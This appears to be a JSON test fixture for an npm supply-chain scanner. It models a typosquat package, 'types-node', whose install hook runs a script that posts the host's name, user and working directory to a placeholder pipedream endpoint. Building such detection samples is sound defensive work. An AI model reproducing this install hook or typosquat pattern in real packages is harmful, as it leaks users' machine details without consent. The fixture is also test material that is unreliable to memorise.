@@ -1,0 +1,24 @@
+{
+ "ecosystem": "npm",
+ "expected": [
+  "name-manipulation",
+  "new-publisher-similar-name",
+  "sparse-metadata",
+  "npm-install-hook",
+  "suspicious-endpoint"
+ ],
+ "files": {
+  "package/index.d.ts": "export {};\n",
+  "package/package.json": "{\n  \"name\": \"types-node\",\n  \"version\": \"20.11.6\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"install\": \"node scripts/setup.js\"\n  }\n}",
+  "package/scripts/setup.js": "const https = require(\"https\");\nconst os = require(\"os\");\n\nconst body = JSON.stringify({ host: os.hostname(), user: os.userInfo().username, cwd: process.cwd() });\nconst req = https.request(\"https://eo1fixture00000.m.pipedream.net.example.invalid/\", { method: \"POST\" });\nreq.write(body);\nreq.end();\n"
+ },
+ "meta": {
+  "created_days_ago": 1,
+  "description": "TypeScript definitions for node",
+  "publisher_is_new": true,
+  "version_count": 1
+ },
+ "name": "types-node",
+ "pattern": "Scope confusion (types-node vs @types/node) with an install script that reports the host",
+ "version": "20.11.6"
+}
